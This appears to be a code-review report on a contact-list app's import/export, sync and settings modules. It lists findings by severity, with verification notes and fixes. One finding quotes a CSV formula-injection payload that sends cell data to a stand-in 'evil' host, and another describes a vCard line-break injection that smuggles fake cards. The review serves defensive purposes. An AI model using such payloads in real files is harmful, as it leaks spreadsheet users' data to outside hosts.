# Lane 3 — routes-io (import_export.py, sync.py, settings.py, importer.py, vcard.py)

## Critical (0)

## High (4)
- [dim 3] vcard.py:15-22 — _escape escapes LF but NEVER CR; _unescape handles \n. Asymmetric on carriage return.
  (a) Data loss: browsers normalise textarea to CRLF; routes/contacts.py:87 only strips ends. Export emits NOTE:line1<CR>\nline2; parse (vcard.py:119) turns the bare CR into a newline, remainder has no ':' and is dropped at vcard.py:148. Every note loses everything after its first line on round-trip.
  (b) vCard injection: a lone CR (reachable from third-party CSV or a Google biography via google_sync.py:555) is emitted raw, smuggling whole fabricated cards.
  fix: in _escape, normalise \r\n and lone \r to \n before the \n -> \\n replacement.
  ORCHESTRATOR VERIFICATION (executed): data loss CONFIRMED — notes returns 'line one' only. Whole-card smuggling CONFIRMED — 2 cards parse back, second named 'Fake Person'. Extra-EMAIL-property claim NOT confirmed — first value wins, real email survives. Severity stands on (a) and the card smuggling.
- [dim 3] routes/import_export.py:48-51 — contact fields written to CSV with no formula-injection neutralisation. A name like =HYPERLINK("http://evil/"&A1,"Click") or @SUM(...) executes in Excel/LibreOffice (CWE-1236). DESIGN 6.1 covers only inbound. fix: prefix any field starting with = + - @ TAB CR with a single quote, in one helper used by export(). ORCHESTRATOR VERIFICATION: CONFIRMED by reading — writer.writerow passes fields raw.
- [dim 7] routes/import_export.py:88-89,97 — `except ValueError: continue` then skipped=0, warnings=[] hardcoded into the summary. import_contact raises ValueError for a rejected type or custom-field name (models.py:585,710) and vcard.parse silently drops cards with no usable name. A 200-card .vcf where 150 fail reports "50 created, 0 skipped, no warnings". The CSV twin at :179-180 does it correctly — one loop written twice, one copy repaired. fix: count the exception path and the dropped cards, pass both to the template.
- [dim 2] vcard.py:151-155 — parser never strips a GROUP PREFIX. RFC 6350 3.3 allows [group "."] name. Google and Apple emit item1.EMAIL;TYPE=INTERNET:..., item2.TEL:... "ITEM1.EMAIL" matches no branch and is dropped silently. Importing a real phone/Google export loses exactly the custom-labelled emails and phones. fix: prop = segments[0].rsplit('.',1)[-1].upper(). ORCHESTRATOR VERIFICATION (executed): CONFIRMED — item1.EMAIL and item2.TEL both dropped; email and phone both None.

## Medium (8)
- [dim 2] import_export.py:44-57, 198-216 — DESIGN 7.2 requires streaming exports via generators; both use io.StringIO + getvalue(), and vcard.emit builds one string from a full list after fetchall(). Code is the wrong side.
- [dim 5] import_export.py:203-210 — get_custom_fields inside the per-contact loop: N+1, 10,001 round-trips for a 10k export.
- [dim 3] import_export.py:112 vs :153 — MAX_IMPORT_BYTES (1 MiB) checked on ONE ingest path. import_apply takes csv_text from the form with no cap, bounded only by the 5 MiB MAX_CONTENT_LENGTH. Also `raw = file.read()` materialises the body BEFORE the cap is tested. fix: apply MAX_IMPORT_BYTES to csv_text; test content_length before the full read.
- [dim 2] routes/sync.py:115-119 — revoke_credentials only os.removes the local token; never calls Google's /revoke. DESIGN 9 names the route "Revoke Google credentials" and 6.2 says revoke and re-auth. The refresh token stays valid at Google while the UI says disconnected.
- [dim 5] routes/settings.py:31 and settings.py:60 — sorted(zoneinfo.available_timezones()) on every settings GET and again per submitted timezone in _valid_timezone. Uncached tz-database walk against a <100ms target. fix: lru_cache(maxsize=1).
- [dim 2] vcard.py:70-73 — company card emits VERSION/FN/ORG and no N. RFC 2426 3.1.2 makes N REQUIRED in 3.0. Strict consumers reject the card.
- [dim 2] vcard.py:80-83 — every custom field exports as X-CL;X-LABEL=<name>, a private property. birthday/address/organization are modelled as first-class in DESIGN 8.2 and named in google_sync.py:572, yet exported proprietarily; BDAY and ADR inbound are dropped. Round-trips inside this app, loses data to every other app.
- [dim 2] DESIGN 9 route table — DOCUMENT is the wrong side: omits GET/POST /contacts/import, POST /contacts/import/apply, GET /contacts/export/vcard. Hand to review-contract.

## Low / Info
- [dim 7] routes/sync.py:117 — revoke_credentials' outcome ignored, success flashed unconditionally; an OSError escapes as a 500.
- [dim 7] routes/sync.py:78 — bare `except Exception:` against DESIGN 12.8 and python.md. Logs via log.exception, so nothing swallowed; the breach is width.
- [dim 2] pyproject.toml:33-46 [tool: mypy] — files lists routes but NOT importer.py or vcard.py. The two modules that parse untrusted text are the two never type-checked.
- [dim 2] all five files [tool: mypy/ruff] — no return annotations on any route function, against CLAUDE.md "type hints on all signatures". Unenforced because ruff selects only E4,E7,E9,F and mypy runs without disallow_untyped_defs.
- [dim 4] import_export.py:137-139 vs :168-169 — import_view writes mapping straight from the stored JSON profile; import_apply whitelists the same values against importer.TARGETS. One consumer validates, the other trusts.
- [dim 11] importer.py:100 vs :115 — an out-of-range column guard exists on one line and not the sibling fifteen lines later. Latent; no live caller reaches it.
- [dim 13] import_export.py:53-57 — import accepts utf-8-sig but export writes no BOM; non-ASCII names open as mojibake in Excel on Windows.
- [dim 15] routes/sync.py:73 — logs the OAuth child's entire stderr to contact-list.log; an InstalledAppFlow traceback can carry the client id/secret from credentials.json.
- [dim 11] routes/sync.py:27 — os.path where python.md says pathlib.
- [dim 2] vcard.py:61-85 — emit never folds; RFC 6350 3.2 says SHOULD fold at 75 octets. Import side unfolds correctly.
- N/A: 8, 9, 10, 12, 17, 2b (each with a stated reason).

## Covered by spec and looks correct
CSRF: app.py:81-86 gates every POST/PUT/DELETE globally with hmac.compare_digest — all four POST routes covered. SQL parameterized throughout. file.filename used only for an .endswith('.vcf') test, never reaches disk; Content-Disposition filenames are literals. _auth_command re-derived independently — both branches build argv from sys.executable plus a constant, list form, no shell. Settings validation: every key has an allow-list or bounds validator, _FORM_KEYS blocks unknown keys, writes all-or-nothing. X-LABEL needs no quoting (RFC 6350 SAFE-CHAR includes WSP, and every field_name writer passes validation). Flashed sync errors are fixed literals, not exception text. The csv_text re-post cannot exceed MAX_CONTENT_LENGTH (percent-encoding expands at most 3x).

## Open questions
- vCard 2.1 QUOTED-PRINTABLE ignored; Android still emits it. Module docstring scopes to 3.0/4.0 so code matches its own contract; whether the contract should widen is a product call.
- Is CSV export meant to be lossless? Custom fields and tags absent from the writer; 4.5 puts tags deliberately out of scope, nothing states intent for custom fields.
- Should import_apply re-validate a stored profile's targets?

## 3 items to fix first
1. vcard.py:15-22 escape CR — one line; simultaneously silent data loss on the most ordinary path and an injection primitive.
2. routes/import_export.py:48-51 neutralise CSV formula injection on export — the one defect reaching outside the process into the user's spreadsheet.
3. routes/import_export.py:88-89 stop swallowing the vCard ValueError — a half-failed import renders as unqualified success; the correct implementation already exists thirty lines below.
